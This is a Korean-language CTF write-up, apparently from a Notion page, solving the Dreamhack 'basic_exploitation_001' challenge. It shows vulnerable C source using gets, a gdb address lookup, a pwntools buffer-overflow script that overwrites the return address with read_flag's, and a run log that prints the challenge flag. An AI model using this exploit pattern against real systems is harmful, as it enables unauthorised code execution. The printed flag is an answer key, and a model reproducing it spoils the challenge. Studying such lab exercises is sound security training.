https://honey-push-30b.notion.site/basic_exploitation_001-9975e72a5a2d48b1a94556b4386192a3
# 문제파일 다운로드

![문제파일 다운로드.PNG](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/21c7576b-d7bc-40d6-b0b6-9eab60373a31/%EB%AC%B8%EC%A0%9C%ED%8C%8C%EC%9D%BC_%EB%8B%A4%EC%9A%B4%EB%A1%9C%EB%93%9C.png)

basic_exploitation_001 문제파일을 다운로드 받을 수 있다.

### **Environment**

```
Ubuntu 16.04
Arch:     i386-32-little
RELRO:    No RELRO
Stack:    No canary found
NX:       NX enabled
PIE:      No PIE (0x8048000)
```

i386-32-little 즉 32비트이므로 32비트 어셈블리어로 작성해야한다.

NX enabled로 되어있는데 이는 스택,힙 영역에서 실행권한을 제거하여 스택에서 쉘코드를 실행시킬수 없게 한다. 그런데 이 문제에서는 실행을 목표로하는 read_flag가 있고 code영역에 이미 위치하므로 별로 상관은 없다.

```c
#include <stdio.h>
#include <stdlib.h>
#include <signal.h>
#include <unistd.h>

void alarm_handler() {
    puts("TIME OUT");
    exit(-1);
}

void initialize() {
    setvbuf(stdin, NULL, _IONBF, 0);
    setvbuf(stdout, NULL, _IONBF, 0);

    signal(SIGALRM, alarm_handler);
    alarm(30);
}

void read_flag() {
    system("cat /flag");
}

int main(int argc, char *argv[]) {

    char buf[0x80];

    initialize();
    
    gets(buf);

    return 0;
}
```

버퍼의 크기는 0x80(128)이고 gets로 버퍼에 입력을 받는데 입력의 크기를 검증하지 않기 때문에 버퍼 오버플로우 공격이 가능하다. read_flag 를 실행시키면 되기 때문에 

버퍼의 크기 0x80

SFP 4바이트 

read_flag의 주소로 해주면 된다.

```python
gdb-peda$ print read_flag
$1 = {<text variable, no debug info>} 0x80485b9 <read_flag>
```

read_flag의 주소를 알아내기위해서 print를 이용해서 주소값을 출력하면 0x80485b9임을 알 수 있다.

```python
from pwn import *

p=remote('host1.dreamhack.games',18438)

payload=b'A'*132
payload+=p32(0x80485b9)

p.sendline(payload)

p.interactive()
```

따라서

버퍼크기 + SFP를 덮을 132바이트에 32비트에 맞게 리틀엔디언으로 read_flag의 주소를 붙여서 전송해주면 된다.

```python
┌──(root💀kali)-[~/바탕화면/basic_exploit_001]
└─# python3 ./answer.py
[+] Opening connection to host1.dreamhack.games on port 18438: Done
[*] Switching to interactive mode
DH{01ec06f5e1466e44f86a79444a7cd116}[*] Got EOF while reading in interactive
$
```

플래그 값을 얻을 수 있다.
